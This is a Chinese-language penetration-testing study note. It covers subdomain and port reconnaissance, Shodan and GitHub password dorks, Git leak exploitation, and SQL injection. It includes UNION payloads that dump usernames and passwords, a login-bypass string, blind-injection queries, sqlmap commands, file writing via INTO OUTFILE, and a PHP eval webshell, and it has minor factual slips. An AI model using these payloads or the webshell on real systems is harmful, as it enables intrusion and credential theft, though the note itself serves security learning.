# 信息收集

## 域名信息收集

### 定义
- 顶级域名：是“.com”、".net"、".org"、".cn"等等。子域名（Subdomain Name）,凡顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据级数的多少分为二级子域名，三级子域名。我国在国际互联网络信息中心正式注册并运行的顶级域名是.cn，这也是我过的一级域名。在顶级域名之下，我国的二级域名又分为类别域名和新郑区域名两类。类别域名共６个，包括用于科研机构的.ac;用与工商金融企业的.com;用于教育机构的.edu;用于政府部门的.gov;用于互联网络信息中心和运行中心的.net;用于非盈利组织的.org。而行政区域名有34个，分别对应于我国各省、自治区和直辖市。

### 工具
- Maltego、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机
- 站长之家:http://tool.chinaz.com/subdomain
- https://dnsdumpster.com/
- 爱站:http://dns.aizhan.com
- https://phpinfo.me/domain/
- 证书透明度公开日志枚举：
	- https://crt.sh/
	- http://censys.io/

## 站点信息收集

### CMS指纹识别
- 在线识别工具：http://whatweb.bugscaner.com/look/ , http://www.yunsee.cn/finger.html
- 本地识别工具：
	- 御剑Web指纹识别
	- 大禹CMS识别：https://github.com/MS0x0/dayu

### CMS漏洞查询
- 

### Web目录探测
- 御剑后台扫描工具（Windows）
- wwwscan命令行工具
- dirb命令工具
- DirBuster(OWASP)

### Web探测
- whatweb
- wpscan(针对于Wordpress专用)

## 端口信息收集

### 工具使用
- nmap
- masscan

### 防御措施
- 关闭不必要的端口
- 设置防火钱
- 定期更新密码
- 更新软件，安装补丁

## 敏感信息收集

### Google Hack
- site:baidu.com //指定搜索域名
- inurl:.php?id= //指定URL中是否存在某些关键字
- intext:网站后台 //指定网页中是否存在某些关键字
- filetype:txt   //指定搜索文件类型
- intitle:后台管理//指定网页标题是否存在某些关键字
- link:baidu.com //指定网页链接
- info:baidu.com //指定搜索网页信息
- https://www.exploit-db.com/google-hacking-database/

### Github泄漏
- site:github.com smtp
- site:github.com smtp @qq.com
- site:github.com sa password
- site:github.com root password
- site:github.com User ID='sa';Password
- site:github.com svn
- site:github.com ftp ftppassword

## 真实IP收集

### CDN
- Content Delivery Network，内容分发网络
- 通过Ping判断是否存在CND
- http://ping.chinaz.com

### 绕过CDN
- 内部邮箱源，收集内部邮箱服务器IP地址
- 网站phpinfo.php文件
- 查询子域名，子域名可能未使用CDN
- 使用国外服务器访问 https://asm.ca.com/en/ping.php
- 查询域名解析记录 https://viewdns.info/

### 验证IP地址
- 直接使用IP访问，如若IP为真实地址，则可以正常访问，反之无法正常访问

## Shodan工具
- 信息收集主要针对于目标的服务器系统、数据库系统、中间件系统、应用程序系统、中间件、边界设备等，甚至还包括系统管理员的信息
- 该工具索引所有和互联网关联的服务器、摄像头、打印机、路由器等
- www.shodan.io

### 基本使用方法
- 搜索Webcam，直接搜索框中输入webcam
- 搜索指定端口，关键字port指定具体端口号
- 搜索指定IP，关键字host指定具体IP地址
- 搜索具体城市，关键字city指定具体城市

### 命令行使用
- easy_install shodan      //安装
- shodan init [key]        //初始化
- shodan count [server]    //查询对应服务使用的数量
- shodan search [key_word] //关键字搜索
- shodan host [ip]         //根据IP查询指定地址相关信息
- shodan info              //查看自身账户信息
- shodan myip              //查看自身外部IP信息
- shodan honeyscore [ip]   //查看是否存在蜜罐

### Python-shodan
```Python
import shodan
SHODAN_API_KEY = ""
api = shodan.Shodan(SHODAN_API_KEY)
result = api.search('key_word')
print(result['total'])

result = api.host('ip')
print(result['country_name'])
```
- https://developer.shodan.io/api

## Git信息泄露
- https://git-scm.com

### 原理
- 解析.git/index文件，找到工程中所有的：（文件名，文件sha1）
- 去.git/objects文件夹下下载对应的文件
- zlib解压文件，按原始的目录结构写入源代码
- 审计源代码，挖掘其中的漏洞

### 利用
- 下载git clone https://github.com/lijiejie/GitHack.git
- python GitHack.py [site]/.git/

## SQL注入

### 原理
- 在解释型语言中，如果程序与用户进行交互，用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码
- 万能密码：[' or 1=1 -- ]
- MySQL5.0以上版本，为方便管理数据库默认定义了information_schema数据库，用来存储数据库元信息，其中具有表schemata（数据库名）、tables（表名）、columns（列名/字段名）
- 在schemata表中，schema_name字段用于存储数据库名
- 在tables表中，table_schema和table_name分别用于存储数据库名和表名
- 在columns表中，column_name（字段名）
- SELECT * FROM table_name where username = '';
- INSERT INTO table_name (key1, key2) values (1, 2);
- UPDATE table_name SET password = '' where username = 'zhangsan';
- DELETE FROM table_name where username = 'lisi';
- MySQL常用的聚合函数：user()、database()、version()

### CMS SQL注入
- 单引号 '
- and 1=1
- and 1=2 
- 如果页面报SQL错误，则代表有可能存在注入漏洞

### SQLmap工具
- 登录注入需要抓取提交的数据包，可以借用burpsuite抓取后复制保存至本地文件test.txt
- sqlmap -r test.txt -p username --dbs
- sqlmap -u "http://..." --dbs / -D 指定数据库 -T 指定表 -C 输出所有字段

### 分类
- 数字型：select * from table_name where id = 1;
- 字符型: select * from table_name where id = '1';

### GET错误注入
1. 利用order by判断字段数
2. 利用union select联合查询，获取表名
```MySQL
0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```
3. 利用union select联合查询，获取字段名
```mysql
0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```
4. 利用union select联合查询，获取字段值
```mysql
0' union select 1,group_concat(username, 0x3a, password),3 from users --+
// 0x3a是分号;
```
### 盲注
- 常分为基于布尔与时间的盲注
- if(ascii(substr(database(),1,1)=115,1,sleep(3))) 当数据库名的第一个字母等于ASCII码115时，执行一次sleep函数等待3秒
- select length(database());
- select substr(database(),1,1);
- select ascii(substr(database(),1,1));
- select ascii(substr(database(),1,1))>N;
- select ascii(substr(database(),1,1))=N;
- select ascii(substr(database(),1,1))<N;

### MySQL注入读写文件
#### 前提
- 用户权限足够高，最好为root
- secure_file_priy不为NULL
- union select 1,\<?php phpinfo();?>,3 into outfile '绝对路径'
- 一句话木马：
```PHP
<?php @eval($_POST['x']);?>
```
#### sqlmap使用
- sqlmap -hh查看详细的帮助信息